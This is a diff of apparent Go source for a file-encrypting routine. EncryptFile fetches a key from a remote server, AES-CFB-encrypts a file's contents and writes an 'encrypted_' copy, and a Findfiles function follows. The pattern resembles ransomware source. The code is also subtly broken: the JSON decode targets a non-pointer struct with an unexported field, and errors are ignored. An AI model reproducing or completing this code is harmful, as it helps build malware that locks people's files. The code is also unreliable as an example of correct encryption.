@@ -35,7 +35,7 @@ func Decryptkey(data string) string {
 	return string(ct)
 }
 
-func EncryptFile(file string) string {
+func EncryptFile(file string) {
 	data, err := os.ReadFile(file)
 	bytes := []byte(data)
 
@@ -50,25 +50,24 @@ func EncryptFile(file string) string {
 	res, err := client.Do(req)
 
 	if err != nil {
-		return ""
+		return 
 	}
 	encoded_key := receivedtoken{}
 	json.NewDecoder(res.Body).Decode(encoded_key)
 	decoded_key := Decryptkey(encoded_key.token)
+	fmt.Println(decoded_key)
 
 	block, err := aes.NewCipher([]byte(decoded_key))
 	ct := make([]byte, aes.BlockSize+len(bytes))
 	iv := ct[:aes.BlockSize]
-	io.ReadFull(rand.Reader, iv)
 
+	io.ReadFull(rand.Reader, iv)
 	stream := cipher.NewCFBEncrypter(block, iv)
 	stream.XORKeyStream(ct[aes.BlockSize:], bytes)
 
-	fmt.Println(bytes)
-	fmt.Println(base64.StdEncoding.EncodeToString(ct))
-
-	return base64.StdEncoding.EncodeToString(ct)
-
+	f, _ := os.Create("encrypted_"+file)
+	f.Write(ct)
+	return
 }
 
 func Findfiles() []string {
